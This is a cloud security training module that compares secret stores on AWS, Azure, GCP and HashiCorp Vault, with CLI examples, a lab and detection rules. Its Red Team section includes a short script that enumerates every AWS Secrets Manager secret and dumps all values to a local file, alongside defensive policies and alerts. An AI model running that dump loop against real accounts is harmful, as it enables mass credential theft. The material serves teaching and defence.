# 03 — Secret Stores Per Cloud

> **Level:** Intermediate
> **Prereqs:** [05-01 — KMS, HSM & Vaults](./kms-hsm-and-vaults.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Credential Access, Collection
> **Authorization scope:** Run only in your own sandbox accounts; all secret values are placeholders.

## What & why

Secret stores hold versioned blobs — database credentials, API keys, TLS certificates — encrypted under your KMS/CMK with IAM-controlled access, automatic rotation, and full audit logging. They differ from KMS in that they manage the *structured value* (key-value pairs, JSON fields, binary) rather than raw cryptographic operations. A cloud engineer must know which store supports automatic rotation, cross-region replication, and structured secrets to avoid rolling their own secret management (which inevitably leaks).

## The OnPrem reality

HashiCorp Vault KV-V2 with dynamic database secrets. A cron job or CI/CD pipeline wrote secrets to `secret/data/production/db-creds`. Applications authenticated to Vault via AppRole, retrieved secrets at startup, and cached them in memory. Rotation meant the DBA ran a script and updated Vault; applications restarted or received a SIGHUP to reload.

```bash
# OnPrem Vault KV-V2 secret lifecycle
vault secrets enable -path=secret kv-v2
vault kv put secret/production/db-creds username="app_user" password="fake-password-placeholder"
vault kv get -version=1 secret/production/db-creds
vault kv put secret/production/db-creds password="new-fake-password-placeholder"
vault kv get secret/production/db-creds  # latest version

# Dynamic DB secrets (auto-created, auto-revoked on lease expiry)
vault write database/roles/readonly \
  db_name=postgres \
  creation_statements="CREATE USER \"{{name}}\" WITH PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
  default_ttl=1h max_ttl=24h
```

## Cross-cloud comparison

| Feature | AWS Secrets Manager | AWS SSM Parameter Store | Azure Key Vault | GCP Secret Manager | OnPrem Vault KV-V2 |
|---|---|---|---|---|---|
| Auto-rotation built-in | Yes (Lambda-based) | No (manual only) | Yes (rotation policy for supported resources) | No (scheduler + Cloud Function) | Yes (dynamic secrets engine) |
| Structured JSON secrets | Yes (SecretString as JSON) | Yes (SecureString = blob) | Yes (value is opaque) | Yes (opaque binary/string) | Yes (multiple key-value fields) |
| Cross-region replication | Yes (ReplicateSecretToRegions) | No | Yes (Azure paired regions) | No (manual replication) | Yes (Vault replication clusters) |
| Versioned | Yes (version stages: AWSCURRENT, AWSPREVIOUS) | Yes (version labels) | Yes (version ID per secret) | Yes (versions with state ENABLED/DISABLED) | Yes (version numbers) |
| Audit log | CloudTrail (`GetSecretValue`) | CloudTrail (`GetParameter`) | Activity Log / diagnostic settings | Cloud Audit Logs (`SecretManager.GetSecret`) | Vault audit devices |
| KMS backing | AWS KMS CMK (your key or `aws/secretsmanager`) | AWS KMS CMK (your key or `aws/ssm`) | Azure Key Vault (internal or BYOK) | Cloud KMS CMEK or Google-managed | Transit engine, or software (memory) |
| Cost model | $0.40/secret/month + $0.05/10k API calls | Standard tier: free (10k params), Advanced: $0.05 per param/month | $0.03/10k transactions | $0.06/secret/version/month + $0.03/10k access ops | Free (self-hosted) |

## AWS

**AWS Secrets Manager** — purpose-built for rotation-aware credential management.

```bash
# Create a DB credential secret
aws secretsmanager create-secret \
  --name "production/db/app-db" \
  --description "App database credentials" \
  --secret-string '{"username":"app_user","password":"placeholder-password-123","host":"example-rds.111111111111.us-east-1.rds.amazonaws.com","port":"5432","dbname":"appdb"}' \
  --kms-key-id alias/app-cmk \
  --region us-east-1

# Retrieve latest version
aws secretsmanager get-secret-value \
  --secret-id "production/db/app-db" \
  --version-stage AWSCURRENT \
  --region us-east-1

# Put a new version (creates AWSPENDING)
aws secretsmanager put-secret-value \
  --secret-id "production/db/app-db" \
  --secret-string '{"username":"app_user","password":"rotated-password-456","host":"example-rds.111111111111.us-east-1.rds.amazonaws.com","port":"5432","dbname":"appdb"}' \
  --version-stages "AWSPENDING" \
  --region us-east-1

# List versions
aws secretsmanager list-secret-version-ids \
  --secret-id "production/db/app-db" \
  --region us-east-1
```

**AWS SSM Parameter Store SecureString** — lighter-weight, no rotation engine, good for config:

```bash
# Store a single secret as SecureString (encrypted via KMS)
aws ssm put-parameter \
  --name "/production/db/password" \
  --value "placeholder-password-123" \
  --type SecureString \
  --key-id alias/app-cmk \
  --region us-east-1 \
  --overwrite

# Retrieve (add --with-decryption for plaintext)
aws ssm get-parameter \
  --name "/production/db/password" \
  --with-decryption \
  --region us-east-1
```

## Azure

**Azure Key Vault** — secrets, keys, and certificates in one vault.

```bash
# Create a secret
az keyvault secret set \
  --vault-name lab-vault-003 \
  --name "production-db-password" \
  --value "placeholder-password-123"

# Retrieve latest version
az keyvault secret show \
  --vault-name lab-vault-003 \
  --name "production-db-password" \
  --query "value" -o tsv

# Retrieve a specific version
az keyvault secret show \
  --vault-name lab-vault-003 \
  --name "production-db-password" \
  --version "version-guid"

# List versions
az keyvault secret list-versions \
  --vault-name lab-vault-003 \
  --name "production-db-password" \
  --query "[].{version:id, enabled:attributes.enabled}" -o table

# Create structured secret (JSON)
az keyvault secret set \
  --vault-name lab-vault-003 \
  --name "production-db-creds" \
  --value '{"username":"app_user","password":"placeholder-password-123","host":"example-db.database.windows.net"}'
```

## GCP

**Secret Manager** — versioned secrets with Cloud KMS backing.

```bash
# Create a secret
gcloud secrets create production-db-password \
  --replication-policy automatic \
  --labels environment=production

# Add a version
echo -n "placeholder-password-123" | gcloud secrets versions add production-db-password \
  --data-file=-

# Access the latest version
gcloud secrets versions access latest \
  --secret production-db-password

# Access a specific version
gcloud secrets versions access 1 \
  --secret production-db-password

# List versions
gcloud secrets versions list production-db-password

# Create a secret with CMEK (customer-managed encryption key)
gcloud secrets create production-db-password \
  --replication-policy automatic \
  --kms-key-name projects/my-project/locations/global/keyRings/app-keyring/cryptoKeys/app-key

# Enable/destroy a version
gcloud secrets versions enable 1 --secret production-db-password
gcloud secrets versions destroy 2 --secret production-db-password
```

## OnPrem (HashiCorp Vault)

```bash
# KV-V2 — versioned static secrets
vault kv put secret/production/db-creds \
  username="app_user" \
  password="placeholder-password-123" \
  host="db.internal.example.com" \
  port="5432"

vault kv get secret/production/db-creds
vault kv get -version=2 secret/production/db-creds

# Dynamic secrets (auto-generated, auto-rotated)
vault read database/creds/readonly
# Returns temporary username/password — lease expires automatically

# Audit — who accessed this secret?
vault audit list
# Shows audit backend; enable file audit:
vault audit enable file file_path=/var/log/vault-audit.log
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Create secret | `vault kv put` | `create-secret` | `az keyvault secret set` | `gcloud secrets create` + `versions add` |
| Retrieve | `vault kv get` | `get-secret-value` | `az keyvault secret show` | `gcloud secrets versions access` |
| List versions | `vault kv metadata get` | `list-secret-version-ids` | `az keyvault secret list-versions` | `gcloud secrets versions list` |
| Auto-rotation | Dynamic secrets engine | Lambda rotation function | Rotation policy | Cloud Scheduler + Function |
| Cross-region | Vault replication | `ReplicateSecretToRegions` | Paired regions | Manual |
| Audit | Vault audit device | CloudTrail | Activity Log | Cloud Audit Logs |

## 🔴 Red Team view

**Mass `GetSecretValue` exfiltration.** Once an attacker has IAM access to Secrets Manager, they enumerate and dump all secrets. This is noisy but fast — a single script can exfiltrate hundreds of secrets in seconds.

```bash
# Attacker compromised role with secretsmanager:ListSecrets + GetSecretValue
# Enumerate all secrets
aws secretsmanager list-secrets --region us-east-1 \
  --query "SecretList[].Name" --output text > /tmp/secret-names.txt

# Bulk exfiltrate to local JSON
for secret in $(cat /tmp/secret-names.txt); do
  echo "{\"name\": \"$secret\", " >> /tmp/exfil.json
  aws secretsmanager get-secret-value --secret-id "$secret" --region us-east-1 >> /tmp/exfil.json
  echo "}," >> /tmp/exfil.json
done

# Result: /tmp/exfil.json contains all secrets in plaintext
```

**Artifacts left:**
- CloudTrail: rapid sequence of `GetSecretValue` calls from a single principal across many secrets
- CloudTrail: `ListSecrets` followed by `GetSecretValue` for every secret — distinctive enumeration pattern
- S3/Syslog: if exfil target is S3, `PutObject` on a `.json` file from an unusual principal

**Defensive pair — IAM condition limiting GetSecretValue to specific resources:**

```json
{
  "Effect": "Deny",
  "Action": "secretsmanager:GetSecretValue",
  "Resource": "*",
  "Condition": {
    "StringNotEquals": {
      "secretsmanager:ResourceTag/team": "${aws:PrincipalTag/team}"
    }
  }
}
```

**Defensive pair — CloudTrail-based alert:**

```
fields @timestamp, userIdentity.arn, requestParameters.secretId
| filter eventName = "GetSecretValue"
| stats count(*) as retrievals by userIdentity.arn, bin(5m)
| filter retrievals > 20
| sort retrievals desc
```

## 🔵 Blue Team view

**Detection signals:**
1. CloudTrail spike: >20 `GetSecretValue` calls in 5 minutes from a single principal
2. `ListSecrets` + `GetSecretValue` pattern — enumeration followed by retrieval
3. `GetSecretValue` from a principal whose tag/team doesn't match the secret's tag (ABAC violation)
4. First-time access for a principal that has never accessed Secrets Manager before

**Preventive controls:**

```bash
# SCP restricting Secrets Manager reads to specific roles
aws organizations create-policy \
  --name restrict-secrets-read \
  --type SERVICE_CONTROL_POLICY \
  --content '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Deny",
      "Action":["secretsmanager:GetSecretValue","secretsmanager:DescribeSecret"],
      "Resource":"*",
      "Condition":{
        "ArnNotLike":{
          "aws:PrincipalArn":[
            "arn:aws:iam::*:role/secrets-reader-prod",
            "arn:aws:iam::*:role/ci-deploy-role"
          ]
        }
      }
    }]
  }'

# Billing-audit tracker — monthly report of GetSecretValue per principal
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --start-time $(date -v-30d +%s) \
  --end-time $(date +%s) \
  --query "Events[?Username!=null].[Username]" --output text | sort | uniq -c | sort -rn
```

**Response steps:**
1. Immediately attach a `DenyAll` policy to the compromised principal
2. Review CloudTrail for all `GetSecretValue` calls from that principal — identify exposed secrets
3. Rotate EVERY secret that was retrieved
4. Review IAM policies granting `secretsmanager:GetSecretValue` — tighten to least privilege per secret path

## Hands-on lab

```bash
# 1. Create a DB credential secret in Secrets Manager
aws secretsmanager create-secret \
  --name "lab/db-credentials" \
  --secret-string '{"user":"admin","password":"lab-password-123","host":"localhost","port":5432}' \
  --region us-east-1

# 2. Retrieve it
aws secretsmanager get-secret-value \
  --secret-id "lab/db-credentials" \
  --query "SecretString" --output text | jq .

# 3. Update it (new version)
aws secretsmanager put-secret-value \
  --secret-id "lab/db-credentials" \
  --secret-string '{"user":"admin","password":"rotated-lab-password-456","host":"localhost","port":5432}'

# 4. Verify version history
aws secretsmanager list-secret-version-ids --secret-id "lab/db-credentials"

# 5. Retrieve previous version
aws secretsmanager get-secret-value \
  --secret-id "lab/db-credentials" \
  --version-stage AWSPREVIOUS

# Azure equivalent
az keyvault secret set \
  --vault-name lab-vault-003 \
  --name "lab-db-credentials" \
  --value '{"user":"admin","password":"lab-password-123","host":"localhost","port":5432}'

az keyvault secret show --vault-name lab-vault-003 --name "lab-db-credentials"

# GCP equivalent
gcloud secrets create lab-db-credentials --replication-policy automatic
echo -n '{"user":"admin","password":"lab-password-123"}' | \
  gcloud secrets versions add lab-db-credentials --data-file=-
gcloud secrets versions access latest --secret lab-db-credentials

# Teardown
aws secretsmanager delete-secret --secret-id "lab/db-credentials" \
  --recovery-window-in-days 7 --region us-east-1
az keyvault secret delete --vault-name lab-vault-003 --name "lab-db-credentials"
gcloud secrets delete lab-db-credentials
```

## Detection rules & checklists

```yaml
# Sigma-style: mass GetSecretValue from single principal
title: Mass Secret Retrieval
logsource:
  service: cloudtrail
  events:
    eventSource: secretsmanager.amazonaws.com
    eventName: GetSecretValue
detection:
  condition: count > 30 by userIdentity.arn in 5m
  severity: critical
```

```bash
# CLI audit: who can list/read all secrets?
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111111111111:role/suspect-role \
  --action-names "secretsmanager:ListSecrets" "secretsmanager:GetSecretValue" \
  --resource-arns "arn:aws:secretsmanager:*:111111111111:secret:*"

# Azure: check who has list/get on all secrets
az role assignment list --include-inherited \
  --scope "/subscriptions/00000000-0000-0000-0000-000000000000" \
  --query "[?roleDefinitionName=='Key Vault Secrets User']"

# GCP: who can access Secret Manager secrets
gcloud secrets list --format json | jq -r '.[].name'
```

## References

- [AWS Secrets Manager User Guide](https://docs.aws.amazon.com/secretsmanager/latest/userguide/)
- [AWS SSM Parameter Store](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html)
- [Azure Key Vault Secrets](https://learn.microsoft.com/en-us/azure/key-vault/secrets/)
- [GCP Secret Manager Documentation](https://cloud.google.com/secret-manager/docs)
- [HashiCorp Vault KV-V2](https://developer.hashicorp.com/vault/docs/secrets/kv/kv-v2)
- Cross-links: [02-IAM](../IAM/), [04-Storage-Data-Security](../Storage-Data-Security/), [05-04 — Rotation](./rotation-and-automatic-providers.md)
